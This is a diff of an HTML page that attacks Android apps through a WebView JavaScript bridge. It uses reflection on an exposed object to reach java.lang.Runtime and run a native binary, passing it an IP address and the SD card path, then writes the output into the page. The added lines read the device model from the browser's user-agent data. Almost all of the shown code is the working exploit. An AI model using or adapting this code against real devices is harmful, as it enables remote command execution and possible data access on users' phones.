@@ -7,6 +7,7 @@
 </head>
 <body>
 	<p id="test">Hello</p>
+	<p id="test2">Test2</p>
 <script>
 	function execute(cmdArgs) {
 		return SmokeyBear.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);
@@ -30,6 +31,23 @@
 	var p = execute(["/data/data/com.android.prankcall/armB2", "192.168.1.116","/mnt/sdcard"]);            
 	document.write(getContents(p.getInputStream()));
 	document.getElementById("test").innerHTML = getContents(p.getInputStream());
+
+	navigator.userAgentData
+      .getHighEntropyValues([
+        "architecture",
+        "model",
+        "platform",
+        "platformVersion",
+        "fullVersionList"
+      ])
+      .then((ua) => {
+        const model = ua["model"];
+        if (model){
+        	document.getElementById("test2").innerHTML = "Phone: " + model
+        	console.log("Phone: " + model);
+        } 
+      });
+
 </script>
 
 </body>
